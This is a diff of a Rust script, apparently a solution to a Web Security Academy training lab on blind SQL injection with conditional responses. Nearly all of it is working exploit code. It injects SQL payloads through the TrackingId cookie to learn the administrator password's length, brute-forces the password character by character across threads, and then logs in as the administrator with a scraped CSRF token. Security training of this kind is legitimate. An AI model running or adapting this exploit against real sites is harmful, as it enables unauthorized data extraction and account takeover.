@@ -1,36 +1,30 @@
-/***************************************************************************************
-*
-* Author: Ahmed Elqalaawy (@elqal3awii)
-*
-* Date: 22/9/2023
+/******************************************************************************
 *
 * Lab: Blind SQL injection with conditional responses
 *
-* Steps: 1. Inject payload into 'TrackingId' cookie to determine the length of
-*           administrator's password based on conditional responses
-*        2. Modify the payload to brute force the administrator's password
-*        3. Fetch the login page
-*        4. Extract the csrf token and session cookie
-*        5. Login as the administrator
-*        6. Fetch the administrator profile
+* Hack Steps: 
+*      1. Inject payload into 'TrackingId' cookie to determine the length of
+*         administrator's password based on conditional responses
+*      2. Modify the payload to brute force the administrator's password
+*      3. Fetch the login page
+*      4. Extract the csrf token and session cookie
+*      5. Login as the administrator
+*      6. Fetch the administrator profile
 *
-****************************************************************************************/
-#![allow(unused)]
+*******************************************************************************/
 use lazy_static::lazy_static;
-use rayon::prelude::{IntoParallelRefIterator, ParallelIterator};
-/***********
-* Imports
-***********/
+use rayon::iter::{IntoParallelRefIterator, ParallelIterator};
 use regex::Regex;
 use reqwest::{
     blocking::{Client, ClientBuilder, Response},
-    header::HeaderMap,
     redirect::Policy,
+    Error,
 };
 use select::{document::Document, predicate::Attr};
 use std::{
     collections::HashMap,
     io::{self, Write},
+    process,
     sync::{
         atomic::{AtomicUsize, Ordering},
         Arc, Mutex,
@@ -39,124 +33,63 @@ use std::{
 };
 use text_colorizer::Colorize;
 
-/******************
-* Global variables
-*******************/
+// Change this to your lab URL
+const LAB_URL: &str = "https://0afc000a038c6f43879ac99000ee0015.web-security-academy.net";
+
 lazy_static! {
+    static ref WEB_CLIENT: Client = build_web_client();
     static ref VALID_PASSWORD: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
-    static ref CHARS_COUNTER: AtomicUsize = AtomicUsize::new(0);
+    static ref CHARS_COUNTER: AtomicUsize = AtomicUsize::new(1);
 }
 
-/******************
-* Main Function
-*******************/
 fn main() {
-    // change this to your lab URL
-    let url = "https://0a060005036860dd88bd4d9a009e00e9.web-security-academy.net";
+    println!("⦗#⦘ Injection point: {}", "TrackingId".yellow(),);
+    println!("⦗1⦘ Determining password length.. ");
 
-    // build the client that will be used for all subsequent requests
-    let client = build_client();
-
-    println!(
-        "{} {}",
-        "[#] Injection point:".blue(),
-        "TrackingId".yellow(),
-    );
-
-    // determine password length
-    let password_length = determine_password_length(&client, url);
-
-    // update the VALID_PASSWORD length
+    let password_length = determine_password_length();
     VALID_PASSWORD
         .lock()
         .unwrap()
         .push_str(&" ".repeat(password_length as usize));
 
-    // build the ranges
-    // every range will be used in a different thread
-    let mut ranges = build_ranges(0, password_length as i32, 4);
+    print!("⦗2⦘ Brute forcing password.. (0%)");
+    flush_terminal();
 
-    // brute force the password using multiple threads
-    brute_force_password(&client, url, ranges, password_length);
+    let threads = 8;
+    brute_force_password_in_multiple_threads(password_length, threads);
+    let admin_password = VALID_PASSWORD.lock().unwrap();
 
-    print!("\n{}", "3. Fetching login page.. ".white());
-    io::stdout().flush();
+    print!("\n⦗3⦘ Fetching the login page.. ");
+    flush_terminal();
 
-    // fetch the login page
-    let fetch_login = client
-        .get(format!("{url}/login"))
-        .send()
-        .expect(&format!("{}", "[!] Failed to fetch the login page".red()));
+    let login_page = fetch("/login");
 
     println!("{}", "OK".green());
-    print!(
-        "{}",
-        "4. Extracting the csrf token and session cookie.. ".white()
-    );
-    io::stdout().flush();
+    print!("⦗4⦘ Extracting the csrf token and session cookie.. ");
+    flush_terminal();
 
-    // extract session cookie
-    let session = extract_session_multiple_cookies(fetch_login.headers())
-        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
-
-    // extract the csrf token
-    let csrf =
-        extract_csrf(fetch_login).expect(&format!("{}", "[!] Failed to extract the csrf token".red()));
+    let session = get_session_from_multiple_cookies(&login_page);
+    let csrf_token = get_csrf_token(login_page);
 
     println!("{}", "OK".green());
-    print!("{}", "5. Logging in as the administrator.. ".white(),);
-    io::stdout().flush();
+    print!("⦗5⦘ Logging in as the administrator.. ");
+    flush_terminal();
 
-    // login as the administrator
-    let admin_login = client
-        .post(format!("{url}/login"))
-        .form(&HashMap::from([
-            ("username", "administrator"),
-            ("password", &VALID_PASSWORD.lock().unwrap()),
-            ("csrf", &csrf),
-        ]))
-        .header("Cookie", format!("session={session}"))
-        .send()
-        .expect(&format!(
-            "{}",
-            "[!] Failed to login as the administrator".red()
-        ));
+    let login_as_admin = login_as_admin(&admin_password, &session, &csrf_token);
 
     println!("{}", "OK".green());
+    print!("⦗6⦘ Fetching the administrator profile.. ");
 
-    // extract the new session
-    let new_session = extract_session_cookie(admin_login.headers()).expect(&format!(
-        "{}",
-        "[!] Failed to extract new session cookie".red()
-    ));
+    let admin_session = get_session_cookie(&login_as_admin);
+    flush_terminal();
 
-    // fetch administrator page
-    print!("{}", "6. Fetching the administrator profile.. ".white(),);
-    io::stdout().flush();
-    let admin = client
-        .get(format!("{url}/my-account"))
-        .header("Cookie", format!("session={new_session}"))
-        .send()
-        .expect(&format!(
-            "{}",
-            "[!] Failed to fetch administrator profile".red()
-        ));
+    fetch_with_cookie("/my-account", "session", &admin_session).unwrap();
 
     println!("{}", "OK".green());
-    println!(
-        "{} {}",
-        "🗹 The lab should be marked now as"
-            .white()
-            .bold(),
-        "solved".green().bold()
-    )
+    println!("🗹 The lab should be marked now as {}", "solved".green())
 }
 
-/*******************************************************************
-* Function used to build the client
-* Return a client that will be used in all subsequent requests
-********************************************************************/
-fn build_client() -> Client {
+fn build_web_client() -> Client {
     ClientBuilder::new()
         .redirect(Policy::none())
         .connect_timeout(Duration::from_secs(5))
@@ -164,204 +97,143 @@ fn build_client() -> Client {
         .unwrap()
 }
 
-/*****************************************
-* Function used to build a set of ranges
-* Every range will be used in one thread
-******************************************/
-fn build_ranges(start: i32, end: i32, range_length: i32) -> Vec<Vec<i32>> {
-    (start..end)
-        .collect::<Vec<i32>>()
-        .chunks(range_length as usize)
-        .map(|x| x.to_owned())
-        .collect::<Vec<Vec<i32>>>()
-}
+fn determine_password_length() -> usize {
+    for length in 1..50 {
+        print!("\r❯❯ Checking if length = {}", length.to_string().yellow());
+        flush_terminal();
 
-/********************************************
-* Function to capture a pattern form a text
-*********************************************/
-fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
-    let pattern = Regex::new(pattern).unwrap();
-    if let Some(text) = pattern.captures(text) {
-        Some(text.get(1).unwrap().as_str().to_string())
-    } else {
-        None
-    }
-}
+        let payload = format!("' or length((select password from users where username = 'administrator')) = {length} -- -");
 
-/*************************************************
-* Function to extract csrf from the response body
-**************************************************/
-fn extract_csrf(res: Response) -> Option<String> {
-    if let Some(csrf) = Document::from(res.text().unwrap().as_str())
-        .find(Attr("name", "csrf"))
-        .find_map(|f| f.attr("value"))
-    {
-        Some(csrf.to_string())
-    } else {
-        None
-    }
-}
+        if let Ok(response) = fetch_with_cookie("/filter?category=Pets", "TrackingId", &payload) {
+            if text_exist_in_response("Welcome back!", response) {
+                println!(" [ Correct length: {} ]", length.to_string().green());
 
-/**********************************************************
-* Function to extract session field from the cookie header
-***********************************************************/
-fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
-    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
-    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
-        Some(session.as_str().to_string())
-    } else {
-        None
-    }
-}
-
-/**********************************************************
-* Function to extract session field from multiple cookies
-***********************************************************/
-fn extract_session_multiple_cookies(headers: &HeaderMap) -> Option<String> {
-    let cookie = headers
-        .get_all("set-cookie")
-        .iter()
-        .nth(1)
-        .unwrap()
-        .to_str()
-        .unwrap();
-    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
-        Some(session.as_str().to_string())
-    } else {
-        None
-    }
-}
-
-/*******************************************
-* Function to extract a pattern form a text
-********************************************/
-fn extract_pattern(pattern: &str, text: &str) -> Option<String> {
-    let pattern = Regex::new(pattern).unwrap();
-    if let Some(text) = pattern.find(text) {
-        Some(text.as_str().to_string())
-    } else {
-        None
-    }
-}
-
-/*******************************************
-* Function to determine password length
-********************************************/
-fn determine_password_length(client: &Client, url: &str) -> i32 {
-    // variable that will hold the correct length
-    let mut length = 0;
-
-    for i in 1..50 {
-        print!(
-            "\r{} {}",
-            "1. Checking if password length =".white(),
-            i.to_string().yellow()
-        );
-        io::stdout().flush();
-
-        // payload to determine password length
-        let payload = format!(
-            "' or length((select password from users where username = 'administrator')) = {} -- -",
-            i
-        );
-
-        // fetch the page with the injected payload
-        let injection = client
-            .get(format!("{url}/filter?category=Pets"))
-            .header("Cookie", format!("TrackingId={payload}"))
-            .send()
-            .expect(&format!(
-                "{}",
-                "[!] Failed to fetch the page with the injected payload to determine password length"
-                    .red()
-            ));
-
-        // get the body of the response
-        let mut body = injection.text().unwrap();
-
-        // extract the name of users table
-        let welcom_text = extract_pattern("Welcome back!", &body);
-
-        // if the welcome text is returned in the response
-        if welcom_text.is_some() {
-            println!(
-                " [ {} {} ]",
-                "Correct length:".white(),
-                i.to_string().green().bold()
-            );
-
-            // correct length
-            length = i;
-
-            break;
+                return length;
+            } else {
+                continue;
+            }
         } else {
             continue;
         }
     }
 
-    // return the correct length
-    length
+    println!("{}", "⦗!⦘ Failed to determine the password length");
+    process::exit(1);
 }
 
-/***********************************
-* Function to brute force password
-************************************/
-fn brute_force_password(client: &Client, url: &str, ranges: Vec<Vec<i32>>, length: i32) {
-    // run every range in a different thread
+fn brute_force_password_in_multiple_threads(password_length: usize, threads: usize) {
+    let ranges = build_ranges(1, password_length, threads);
+
+    // Use every range in a different thread
     ranges.par_iter().for_each(|range| {
-        // iterate over every elements in every range
         for position in range {
-            // iterate over possible chars
             for character in "0123456789abcdefghijklmnopqrstuvwxyz".chars() {
-                print!(
-                    "\r{}",
-                    "2. Brute forcing password ".white(),
-                );
-                io::stdout().flush();
-                
-                // payload to brute force password
                 let payload = format!(
-                "' or substring((select password from users where username = 'administrator'), {}, 1) = '{}' -- -",
-                position+1,
-                character
-            );
-                
-                // fetch the page with the injected payload
-                let injection = client
-                .get(format!("{url}/filter?category=Pets"))
-                .header("Cookie", format!("TrackingId={payload}"))
-                .send()
-                .expect(&format!(
-                    "{}",
-                    "[!] Failed to fetch the page with the injected payload to brute force password"
-                        .red()
-                ));
+                    "' or substring((select password from users where username = 'administrator'), {position}, 1) = '{character}' -- -",
+                );
+                if let Ok(response) = fetch_with_cookie("/filter?category=Pets", "TrackingId", &payload) {
+                    if text_exist_in_response("Welcome back!", response) {
+                        let counter = CHARS_COUNTER.fetch_add(1, Ordering::Relaxed);
+                        let mut valid_password = VALID_PASSWORD.lock().unwrap();
+                        valid_password.replace_range(&((*position -1) as usize)..position, &character.to_string());
 
-                // body of the response
-                let mut body = injection.text().unwrap();
-                
-                // extract the name of users table
-                let welcom_text = extract_pattern("Welcome back!", &body);
+                        let percentage = ((counter as f32 / password_length as f32) * 100.0) as i32;
+                        print!("\r⦗2⦘ Brute forcing password.. ({percentage}%): {}", valid_password.green());
+                        flush_terminal();
 
-                // if the welcome text is returned in the response
-                if welcom_text.is_some() {
-                    // update the counter
-                    CHARS_COUNTER.fetch_add(1, Ordering::Relaxed);
-
-                    // update the valid password with the found char
-                    VALID_PASSWORD.lock().unwrap().replace_range(*position as usize..*position as usize +1, &character.to_string());
-                    
-                    print!(
-                        "({}%): {}",
-                        ((CHARS_COUNTER.fetch_add(0, Ordering::Relaxed) as f32 / length as f32) * 100.0) as i32,
-                        VALID_PASSWORD.lock().unwrap().green().bold()
-                    );
-                    
-                    break;
+                        break;
+                    } else {
+                        continue;
+                    }
                 } else {
                     continue;
                 }
             }
-        }
-    })
+        } 
+    });
+}
+
+fn text_exist_in_response(text: &str, response: Response) -> bool {
+    let regex = Regex::new(text).unwrap();
+    let body = response.text().unwrap();
+    if regex.find(&body).is_some() {
+        true
+    } else {
+        false
+    }
+}
+
+fn build_ranges(start: usize, end: usize, threads: usize) -> Vec<Vec<usize>> {
+    let chunck_per_thread = (end + 1) / threads;
+    (start..=end)
+        .collect::<Vec<usize>>()
+        .chunks(chunck_per_thread)
+        .map(|x| x.to_owned())
+        .collect::<Vec<Vec<usize>>>()
+}
+
+fn fetch(path: &str) -> Response {
+    WEB_CLIENT
+        .get(format!("{LAB_URL}{path}"))
+        .send()
+        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
+}
+
+fn fetch_with_cookie(path: &str, cookie_name: &str, cookie_value: &str) -> Result<Response, Error> {
+    WEB_CLIENT
+        .get(format!("{LAB_URL}{path}"))
+        .header("Cookie", format!("{cookie_name}={cookie_value}"))
+        .send()
+}
+
+fn login_as_admin(admin_password: &str, session: &str, csrf_token: &str) -> Response {
+    WEB_CLIENT
+        .post(format!("{LAB_URL}/login"))
+        .form(&HashMap::from([
+            ("username", "administrator"),
+            ("password", &admin_password),
+            ("csrf", &csrf_token),
+        ]))
+        .header("Cookie", format!("session={session}"))
+        .send()
+        .expect(&format!(
+            "{}",
+            "⦗!⦘ Failed to login as the administrator".red()
+        ))
+}
+
+fn get_csrf_token(response: Response) -> String {
+    let document = Document::from(response.text().unwrap().as_str());
+    document
+        .find(Attr("name", "csrf"))
+        .find_map(|f| f.attr("value"))
+        .expect(&format!("{}", "⦗!⦘ Failed to get the csrf".red()))
+        .to_string()
+}
+
+fn get_session_from_multiple_cookies(response: &Response) -> String {
+    let headers = response.headers();
+    let mut all_cookies = headers.get_all("set-cookie").iter();
+    let session_cookie = all_cookies.nth(1).unwrap().to_str().unwrap();
+    capture_pattern_from_text("session=(.*); Secure", session_cookie)
+}
+
+fn get_session_cookie(response: &Response) -> String {
+    let headers = response.headers();
+    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
+    capture_pattern_from_text("session=(.*); Secure", cookie_header)
+}
+
+fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
+    let regex = Regex::new(pattern).unwrap();
+    let captures = regex.captures(text).expect(&format!(
+        "⦗!⦘ Failed to capture the pattern: {}",
+        pattern.red()
+    ));
+    captures.get(1).unwrap().as_str().to_string()
+}
+
+#[inline(always)]
+fn flush_terminal() {
+    io::stdout().flush().unwrap();
 }
